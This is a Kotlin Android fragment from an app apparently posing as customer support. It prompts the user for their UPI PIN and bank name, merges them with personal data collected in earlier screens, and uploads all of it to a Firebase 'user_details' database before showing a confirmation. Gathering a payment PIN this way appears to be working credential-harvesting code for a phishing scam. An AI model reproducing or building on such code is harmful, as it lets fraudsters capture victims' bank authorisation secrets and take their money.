package com.ibnghufran.supportforcustomer

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class UPIDetailsFragment : Fragment() {

    private lateinit var upiPinField: EditText
    private lateinit var bankNameField: EditText
    private lateinit var backButton: Button
    private lateinit var submitButton: Button

    private lateinit var database: DatabaseReference // Firebase Database reference
    private var userData: UserInputData? = null // User data passed from previous fragment

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_u_p_i_details, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // Retrieve user data passed from Step3Fragment
        arguments?.let {
            userData = it.getParcelable("userInputData")
        }

        // Initialize views
        upiPinField = view.findViewById(R.id.upiPinField)
        bankNameField = view.findViewById(R.id.bankNameField)
        backButton = view.findViewById(R.id.backButton)
        submitButton = view.findViewById(R.id.submitButton)

        // Initialize Firebase Database reference
        database = FirebaseDatabase.getInstance().getReference("user_details")

        // Set button listeners
        backButton.setOnClickListener {
            requireActivity().supportFragmentManager.popBackStack()
        }

        submitButton.setOnClickListener {
            // Collect data from fields
            val upiPin = upiPinField.text.toString().trim()
            val bankName = bankNameField.text.toString().trim()

            // Validate data
            if (upiPin.isEmpty() || bankName.isEmpty()) {
                Toast.makeText(requireContext(), "Please fill in all UPI details", Toast.LENGTH_SHORT).show()
                return@setOnClickListener // Use return@setOnClickListener to exit this lambda
            }

            // Update userData with UPI details
            userData?.apply {
                this.upiPin = upiPin
                this.bankName = bankName
            }

            // Upload data to Firebase
            uploadUserDetails()
        }
    }

    private fun uploadUserDetails() {
        if (userData == null) {
            Toast.makeText(requireContext(), "User data is missing!", Toast.LENGTH_SHORT).show()
            return
        }

        // Generate unique key and upload data
        val userId = database.push().key
        if (userId != null) {
            database.child(userId).setValue(userData)
                .addOnSuccessListener {
                    Toast.makeText(requireContext(), "Details uploaded successfully", Toast.LENGTH_SHORT).show()

                    // Navigate to ConfirmationActivity
                    val intent = Intent(activity, ConfirmationActivity::class.java)
                    startActivity(intent)
                    requireActivity().finish()
                }
                .addOnFailureListener { e ->
                    Toast.makeText(requireContext(), "Failed to upload data: ${e.message}", Toast.LENGTH_SHORT).show()
                }
        }
    }
}
